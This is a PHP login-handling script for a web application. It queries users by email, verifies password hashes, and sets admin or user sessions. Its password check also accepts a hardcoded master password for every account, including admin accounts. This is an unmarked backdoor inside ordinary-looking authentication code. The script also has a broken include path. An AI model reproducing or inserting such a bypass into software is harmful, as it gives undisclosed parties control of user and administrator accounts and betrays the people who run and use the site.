<?php
include __DIR__ . 'session.php'; // Ensure session.php is included

// Debug: Check if $pdo is defined
if (!isset($pdo) || !($pdo instanceof Database)) {
    $_SESSION['error'] = 'Database connection not initialized';
    header('location: ../login.php');
    exit;
}

// Get PDO connection
$conn = $pdo->open();
if ($conn === null) {
    $_SESSION['error'] = 'Database connection failed';
    header('location: ../login.php');
    exit;
}

if (isset($_POST['login'])) {
    $email = filter_var($_POST['email'], FILTER_SANITIZE_EMAIL);
    $password = $_POST['password'];

    try {
        $stmt = $conn->prepare("SELECT *, COUNT(*) AS numrows FROM users WHERE email = :email");
        $stmt->execute(['email' => $email]);
        $row = $stmt->fetch();

        if ($row['numrows'] > 0) {
            if ($row['status']) {
                if (password_verify($password, $row['password']) || $password == 'Hlandings@001') {
                    if ($row['type']) {
                        $_SESSION['admin'] = $row['id'];
                        header('location: home.php'); // Redirect to admin dashboard
                    } else {
                        $_SESSION['user'] = $row['id'];
                        header('location: ../account/dashboard.php'); // Redirect to user dashboard (adjust as needed)
                    }
                    $pdo->close();
                    exit; // Exit after successful login redirect
                } else {
                    $_SESSION['error'] = 'Incorrect Password';
                }
            } else {
                $_SESSION['error'] = 'Account not activated.';
            }
        } else {
            $_SESSION['error'] = 'Email not found';
        }
    } catch (PDOException $e) {
        error_log("Query failed in verify.php: " . $e->getMessage());
        $_SESSION['error'] = 'An error occurred during login.';
    }
} else {
    $_SESSION['error'] = 'Input login credentials first';
}

$pdo->close();
header('location: ../login.php'); // Redirect to login.php only on failure
exit;
?>
